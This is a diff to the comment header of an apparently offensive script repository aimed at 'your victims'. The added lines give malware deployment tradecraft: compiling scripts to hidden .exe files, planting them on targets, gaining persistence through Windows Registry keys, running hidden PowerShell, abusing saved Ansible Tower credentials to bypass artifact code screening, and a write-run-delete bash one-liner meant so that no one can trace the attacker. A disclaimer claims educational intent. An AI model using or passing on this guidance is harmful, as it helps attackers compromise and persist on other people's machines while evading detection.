@@ -20,8 +20,10 @@
 ##
 ## Please ONLY run these scripts on your victims, NOT your good selves...
 ##
-## Best Practices:
+## Best Practices for compiling malware to .exe:
 ## Use Python compiler cx_Freeze
+## Reside the .exe & .dll to your targets
+## Gain persistency using Registry keys in Windows
 ## 
 ## Installing cx_Freeze
 ## python -m pip install cx_Freeze --user IGS;
@@ -29,9 +31,15 @@
 ## Compiling a single .py file:
 ## python -m cx_Freeze single.py;
 ##
-##
 ## Approach 2
-## Launching these shit using encrypted SSH tunnels
+## Use Python compiler pyinstaller
+## python -m pyinstall single.py --onefile --noconsole;
+## Reside the only .exe to your targets
+## Gain persistency using Registry keys in Windows
+##
+## Approach 3
+## Fileless hacking
+## Launching all these crazy shit using encrypted SSH tunnels
 ## 
 ## Encapsulate these maliacious payloads on Windows/ Linux using: 
 ## Fileless malicious payloads
@@ -45,7 +53,19 @@
 ## python ./virus.py &&
 ## rm -rf tempDir/virus.py
 ## 
-## Grab an Ansible Tower => Enumerate a user with saved password for Privilege Escalation => using "commands" to bypass artifactory code screening
+## Approach 4
+## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "commands" entry to bypass artifactory code screening with using a playbook
+## Send Fileless malicious payloads
+## Windows => open cmd.exe:
+## cmd terminal type:
+## Powershell.exe -windowStyle hidden -command "line1; line2; line3; line4"
+##
+## Linux:
+## Bash terminal:
+## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
+## python ./virus.py &&
+## rm -rf tempDir/virus.py
+##
 ## Thus, no one can easily trace what the heck you did to them
 ##
 ## If you persist doing these crazy shit without formal permissions
@@ -53,7 +73,7 @@
 ##
 ## Do NOT blame this repository owner
 ## This repository owner NEVER suggests hacktivism
-## This repository owner suggests continuous learning & defending by mimincking why & how malicious hackers portrait their skills
+## This repository owner suggests continuous learning & defending by mimicking why & how malicious hackers portrait their skills
 ##
 ## ============================================
 ## Usage
